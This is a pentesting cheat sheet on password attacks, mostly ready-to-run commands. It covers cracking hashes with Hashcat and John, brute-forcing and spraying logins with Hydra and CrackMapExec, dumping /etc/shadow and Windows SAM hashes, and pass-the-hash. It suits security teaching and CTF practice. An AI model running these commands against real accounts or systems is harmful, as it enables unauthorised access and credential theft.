# 🔓 Password Attacks

> Cracking hashes, brute-forcing services, and password enumeration techniques.

---

## Types of Password Attacks

| Attack Type | Description |
|-------------|-------------|
| **Brute Force** | Try every possible combination |
| **Dictionary** | Use a wordlist of common passwords |
| **Hybrid** | Dictionary + rules (append numbers, capitalise, etc.) |
| **Rainbow Table** | Pre-computed hash → password lookup |
| **Credential Stuffing** | Use leaked credentials from breaches |
| **Password Spraying** | One password tried against many users |

---

## Identifying Hashes

Before cracking, you need to know what type of hash you have.

```bash
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
hash-identifier
# Or check the format manually:
```

| Hash | Length | Example |
|------|--------|---------|
| MD5 | 32 chars | `5f4dcc3b5aa765d61d8327deb882cf99` |
| SHA1 | 40 chars | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` |
| SHA256 | 64 chars | `...` |
| NTLM | 32 chars | Same format as MD5, different context |
| bcrypt | Starts with `$2b$` | `$2b$12$...` |
| SHA-512crypt | Starts with `$6$` | Linux `/etc/shadow` |

---

## Hashcat

Hashcat is the fastest hash cracker (uses GPU).

### Basic Syntax

```bash
hashcat -m <mode> -a <attack> <hashfile> <wordlist>
```

### Common Hash Modes (`-m`)

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1800 | SHA-512crypt (`$6$`, Linux shadow) |
| 1000 | NTLM (Windows) |
| 3200 | bcrypt |
| 16500 | JWT |
| 22000 | WPA2 (wifi) |

### Attack Modes (`-a`)

| Mode | Type |
|------|------|
| 0 | Straight (dictionary) |
| 1 | Combination |
| 3 | Brute force (mask) |
| 6 | Hybrid wordlist + mask |

### Examples

```bash
# Dictionary attack
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Brute force (6 digit PIN)
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d

# Hybrid (password + 2 digits)
hashcat -m 0 -a 6 hash.txt rockyou.txt ?d?d

# Dictionary with rules
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked results
hashcat -m 0 hash.txt --show
```

### Mask Placeholders

| Symbol | Character Set |
|--------|--------------|
| `?l` | Lowercase (a-z) |
| `?u` | Uppercase (A-Z) |
| `?d` | Digits (0-9) |
| `?s` | Special (!@#$...) |
| `?a` | All of the above |

---

## John the Ripper

John is more versatile — handles many formats automatically.

```bash
# Auto-detect and crack
john hash.txt

# Specify wordlist
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Specify format explicitly
john hash.txt --format=md5 --wordlist=rockyou.txt
john hash.txt --format=bcrypt --wordlist=rockyou.txt

# Show cracked passwords
john hash.txt --show

# Crack /etc/shadow (combine with /etc/passwd first)
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt
```

### Convert Files to John Format

```bash
zip2john protected.zip > zip.hash       # ZIP files
pdf2john protected.pdf > pdf.hash       # PDF files
ssh2john id_rsa > ssh.hash              # SSH private keys
keepass2john database.kdbx > kp.hash   # KeePass databases
```

---

## Hydra — Online Brute Force

Hydra attacks login forms and network services.

```bash
# SSH brute force
hydra -l admin -P rockyou.txt ssh://192.168.1.100

# FTP
hydra -l admin -P rockyou.txt ftp://192.168.1.100

# HTTP POST login form
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Multiple usernames from file
hydra -L users.txt -P rockyou.txt ssh://192.168.1.100

# RDP
hydra -l administrator -P rockyou.txt rdp://192.168.1.100

# Limit speed (avoid lockouts)
hydra -l admin -P rockyou.txt -t 4 ssh://192.168.1.100
```

---

## Password Spraying

Try one password against many accounts (avoids lockouts).

```bash
# With CrackMapExec (SMB / Active Directory)
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --no-bruteforce

# With Hydra
hydra -L users.txt -p 'Password123' ssh://192.168.1.100

# With Spray (Office 365 / Azure AD)
spray.py -t https://login.microsoftonline.com -u users.txt -p 'Password1'
```

---

## Wordlists

| Wordlist | Location | Use |
|----------|----------|-----|
| RockYou | `/usr/share/wordlists/rockyou.txt` | General purpose — 14M passwords |
| SecLists | `/usr/share/seclists/` | Huge collection for many uses |
| Kaonashi | GitHub | Real-world password patterns |
| CeWL-generated | Custom | Scraped from target's own website |

### Generate Custom Wordlists

```bash
# CeWL — scrape words from target website
cewl https://target.com -d 3 -m 8 > custom_wordlist.txt

# Crunch — pattern-based generation
crunch 8 8 0123456789 > numbers8.txt        # All 8-digit numbers
crunch 6 10 abcdefABCDEF -o output.txt      # 6-10 char hex strings
crunch 8 8 -t "Password?d?d" > pass.txt     # Pattern: Password + 2 digits
```

---

## Windows Credential Attacks

### Extract NTLM Hashes (Requires Admin/System)

```bash
# Impacket — remote dump
impacket-secretsdump domain/admin:password@192.168.1.100

# Local (from compromised machine)
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

### Pass-the-Hash (No Cracking Needed)

```bash
# Use the NTLM hash directly without cracking it
impacket-psexec -hashes LM:NT administrator@192.168.1.100
crackmapexec smb 192.168.1.100 -u administrator -H 'NTLM_HASH'
```

---

## Protecting Against Password Attacks

- Use long passphrases (4+ random words)
- Use a password manager
- Enable MFA / 2FA
- Use bcrypt/Argon2 for storage (slow hashing)
- Implement account lockout policies
- Monitor for spray patterns

---

> 💡 `rockyou.txt` covers most CTF challenges. For real engagements, build a custom wordlist with CeWL + rules.
